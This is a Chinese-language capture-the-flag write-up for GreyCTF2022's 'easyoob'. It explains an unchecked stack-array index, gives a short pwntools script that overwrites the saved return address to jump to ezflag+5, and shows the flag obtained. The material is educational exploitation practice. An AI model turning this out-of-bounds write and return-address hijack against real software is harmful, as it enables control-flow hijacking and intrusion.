# GreyCTF2022 - easyoob

## 题目简述

程序把排行榜数组放在栈上，却直接使用用户给出的下标，没有检查上界。数组后方就是当前函数的保存控制数据，因此可用越界写把返回地址改到程序自带的 `ezflag` 函数。

## 解题过程

先用反汇编确认排行榜元素大小、数组基址与保存返回地址的距离。按源码布局计算，索引 `0x15` 对应返回地址槽。二进制未开启 PIE，`ezflag` 地址固定；函数开头有常规栈帧初始化，因此官方利用跳到 `ezflag+5`，避开不适合当前栈状态的序言。

```python
from pwn import *

p = process('./easyoob')
win = ELF('./easyoob', checksec=False).sym['ezflag'] + 5

# 按菜单格式向 leaderboard[0x15] 写入 win
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'index: ', str(0x15).encode())
p.sendlineafter(b'value: ', str(win).encode())
p.interactive()
```

当当前函数返回时，控制流进入 `ezflag` 并打印：

```text
grey{g00d_j0b_n0w_g0_7ry_easyoob2}
```

## 方法总结

数组越界题应把“逻辑索引”换算成真实字节偏移，再与栈帧布局对照。选择跳转地址时还要检查目标函数序言和栈对齐；简单地写函数首地址不一定在被劫持的调用上下文中稳定执行。
